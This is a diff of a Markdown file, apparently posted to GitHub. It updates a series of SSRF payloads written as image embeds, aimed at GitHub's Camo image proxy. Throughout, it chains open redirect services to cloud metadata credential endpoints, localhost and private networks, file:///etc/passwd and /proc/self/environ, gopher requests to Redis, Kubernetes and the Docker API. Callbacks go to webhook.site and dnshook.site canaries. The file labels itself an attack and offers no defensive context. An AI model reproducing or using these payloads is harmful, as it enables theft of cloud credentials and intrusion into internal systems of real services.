@@ -1,104 +1,94 @@
-# SSRF Test v20 - Open Redirect Chains & GitHub-Specific Vectors
+# SSRF Test v21 - Redirect Chain SSRF Deep Dive
 
-Testing GitHub-specific redirect endpoints and chained SSRF.
+Testing if Camo's redirect following bypasses internal IP checks.
 
 ## Canary
-![](https://webhook.site/4ef122fd-20c5-45fc-bcc0-0c7bfe09a646/v20-canary.gif)
+![](https://webhook.site/0e5ce386-8634-418a-8abd-f9cd8768638f/v21-canary.gif)
 
-## 1. GitHub Redirect Endpoints
+## 1. httpbin.org Redirect to Internal IPs
 
-### /settings/tokens redirect
-![redir1](https://github.com/settings/tokens/new?redirect_uri=http://webhook.site/4ef122fd-20c5-45fc-bcc0-0c7bfe09a646/github-token-redir.gif)
+### AWS Metadata via redirect
+![meta1](http://httpbin.org/redirect-to?url=http://169.254.169.254/latest/meta-data/)
+![meta2](http://httpbin.org/redirect-to?url=http://169.254.169.254/latest/user-data)
+![meta3](http://httpbin.org/redirect-to?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/)
 
-### OAuth authorization redirect
-![oauth1](https://github.com/login/oauth/authorize?client_id=test&redirect_uri=http://webhook.site/4ef122fd-20c5-45fc-bcc0-0c7bfe09a646/oauth.gif)
+### Localhost via redirect
+![local1](http://httpbin.org/redirect-to?url=http://127.0.0.1/)
+![local2](http://httpbin.org/redirect-to?url=http://localhost/)
+![local3](http://httpbin.org/redirect-to?url=http://0.0.0.0/)
 
-### Link redirector
-![link1](https://github.com/link?redirect=http://webhook.site/4ef122fd-20c5-45fc-bcc0-0c7bfe09a646/link-redir.gif)
+### Internal networks via redirect
+![int1](http://httpbin.org/redirect-to?url=http://10.0.0.1/)
+![int2](http://httpbin.org/redirect-to?url=http://192.168.1.1/)
+![int3](http://httpbin.org/redirect-to?url=http://172.16.0.1/)
 
-### Enterprise SSO callback
-![sso1](https://github.com/orgs/test/saml/callback?redirect=http://webhook.site/4ef122fd-20c5-45fc-bcc0-0c7bfe09a646/sso.gif)
+## 2. Multiple Redirect Hops
 
-## 2. Raw Content Redirect
+### Triple redirect
+![hop1](http://httpbin.org/redirect/3?url=http://169.254.169.254/latest/meta-data/)
 
-### Raw GitHub redirect
-![raw1](https://github.com/jessi2000/progsjessi/raw/main/test.gif)
-![raw2](https://raw.githubusercontent.com/jessi2000/progsjessi/main/test.gif)
+### Absolute redirect
+![abs1](http://httpbin.org/absolute-redirect/1?url=http://169.254.169.254/)
 
-### Objects redirect
-![obj1](https://objects.githubusercontent.com/github-production-release-asset-2e65be/test.gif)
+### Relative redirect  
+![rel1](http://httpbin.org/relative-redirect/1?url=http://127.0.0.1/)
 
-## 3. Camo Self-Reference
+## 3. DNS Exfiltration After Redirect
 
-### Camo pointing to Camo (loop detection)
-![camo1](https://camo.githubusercontent.com/test/test.gif)
-![camo2](https://camo.githubusercontent.com/raw/test.gif)
+### If redirect works, trigger DNS callback
+![dns1](http://httpbin.org/redirect-to?url=http://redirect-success.0e5ce386-8634-418a-8abd-f9cd8768638f.dnshook.site/test.gif)
+![dns2](http://httpbin.org/redirect-to?url=http://0e5ce386-8634-418a-8abd-f9cd8768638f.dnshook.site/after-redir.gif)
 
-### Camo to raw.githubusercontent
-![camoraw](https://camo.githubusercontent.com/raw/webhook.site/4ef122fd-20c5-45fc-bcc0-0c7bfe09a646/camo-raw.gif)
+## 4. Protocol Downgrade via Redirect
 
-## 4. GitHub API Endpoints as Images
+### HTTPS to HTTP redirect
+![proto1](https://httpbin.org/redirect-to?url=http://webhook.site/0e5ce386-8634-418a-8abd-f9cd8768638f/https-to-http.gif)
+![proto2](https://httpbin.org/redirect-to?url=http://169.254.169.254/latest/meta-data/)
 
-### API redirect tests
-![api1](https://api.github.com/zen.gif)
-![api2](https://api.github.com/octocat.gif)
-![api3](https://api.github.com/user.gif)
+## 5. Alternative Redirect Services
 
-### GraphQL endpoint  
-![graphql](https://api.github.com/graphql.gif)
+### request.basno.com (another redirect service)
+![basno1](http://request.basno.com/anything/redirect?url=http://webhook.site/0e5ce386-8634-418a-8abd-f9cd8768638f/basno.gif)
 
-## 5. GitHub Actions Artifacts
+### mockbin.io
+![mock1](http://mockbin.io/redirect/302?to=http://webhook.site/0e5ce386-8634-418a-8abd-f9cd8768638f/mockbin.gif)
 
-### Artifact download redirect
-![art1](https://github.com/jessi2000/progsjessi/actions/artifacts/download?name=test.gif)
-![art2](https://github.com/jessi2000/progsjessi/suites/artifacts/test.gif)
+## 6. File Protocol via Redirect
 
-## 6. GitHub Packages
+![file1](http://httpbin.org/redirect-to?url=file:///etc/passwd)
+![file2](http://httpbin.org/redirect-to?url=file:///proc/self/environ)
 
-### Container registry
-![pkg1](https://ghcr.io/jessi2000/test/test.gif)
-![pkg2](https://npm.pkg.github.com/jessi2000/test.gif)
+## 7. Gopher Protocol via Redirect
 
-## 7. External Redirect Services Through Camo
+![gopher1](http://httpbin.org/redirect-to?url=gopher://localhost:25/)
+![gopher2](http://httpbin.org/redirect-to?url=gopher://localhost:6379/_INFO)
 
-### Bitly/TinyURL style
-![tiny1](http://tinyurl.com/create.php?url=http://webhook.site/4ef122fd-20c5-45fc-bcc0-0c7bfe09a646/tiny.gif)
+## 8. Cloud Metadata via Redirect
 
-### URL shorteners that redirect
-![short1](http://httpbin.org/redirect-to?url=http://webhook.site/4ef122fd-20c5-45fc-bcc0-0c7bfe09a646/httpbin-redir.gif)
-![short2](http://httpbin.org/redirect-to?url=http://169.254.169.254/latest/meta-data/)
-![short3](http://httpbin.org/redirect-to?url=http://127.0.0.1/test.gif)
+### GCP
+![gcp1](http://httpbin.org/redirect-to?url=http://metadata.google.internal/computeMetadata/v1/)
+![gcp2](http://httpbin.org/redirect-to?url=http://169.254.169.254/computeMetadata/v1/)
 
-### Multiple redirects
-![multi1](http://httpbin.org/redirect/3?url=http://webhook.site/4ef122fd-20c5-45fc-bcc0-0c7bfe09a646/multi-redir.gif)
+### Azure
+![az1](http://httpbin.org/redirect-to?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01)
+![az2](http://httpbin.org/redirect-to?url=http://168.63.129.16/machine)
 
-## 8. DNS Callback Verification
+### DigitalOcean
+![do1](http://httpbin.org/redirect-to?url=http://169.254.169.254/metadata/v1.json)
 
-![dns1](http://4ef122fd-20c5-45fc-bcc0-0c7bfe09a646.dnshook.site/v20-dns.gif)
-![dns2](http://redirect-test.4ef122fd-20c5-45fc-bcc0-0c7bfe09a646.dnshook.site/redir.gif)
+## 9. Kubernetes via Redirect
 
-## 9. GitHub Enterprise Endpoints (if applicable)
+![k8s1](http://httpbin.org/redirect-to?url=http://kubernetes.default.svc/)
+![k8s2](http://httpbin.org/redirect-to?url=http://10.0.0.1:443/api/v1/)
 
-### GHE metadata
-![ghe1](https://github.localhost/meta.gif)
-![ghe2](https://github-enterprise/api/v3/meta.gif)
+## 10. Docker via Redirect
 
-## 10. Release Asset Redirect
+![dock1](http://httpbin.org/redirect-to?url=http://172.17.0.1:2375/version)
+![dock2](http://httpbin.org/redirect-to?url=http://host.docker.internal/)
 
-### Release download redirect
-![rel1](https://github.com/jessi2000/progsjessi/releases/download/v1/test.gif)
-![rel2](https://github-releases.githubusercontent.com/test.gif)
+## 11. Verification - Confirm Redirect Works
 
-## 11. Gist Raw Content
+![verify1](http://httpbin.org/redirect-to?url=http://webhook.site/0e5ce386-8634-418a-8abd-f9cd8768638f/redirect-verify.gif)
+![verify2](https://webhook.site/0e5ce386-8634-418a-8abd-f9cd8768638f/direct-verify.gif)
 
-### Gist redirect
-![gist1](https://gist.github.com/jessi2000/raw/test.gif)
-![gist2](https://gist.githubusercontent.com/jessi2000/raw/test.gif)
-
-## 12. Webhook Test
-
-### External validation
-![ext1](http://webhook.site/4ef122fd-20c5-45fc-bcc0-0c7bfe09a646/external-test.gif)
-![ext2](https://webhook.site/4ef122fd-20c5-45fc-bcc0-0c7bfe09a646/https-test.gif)
-
-Version 20 - Open Redirect Chain SSRF Testing
+Version 21 - Redirect Chain SSRF Attack
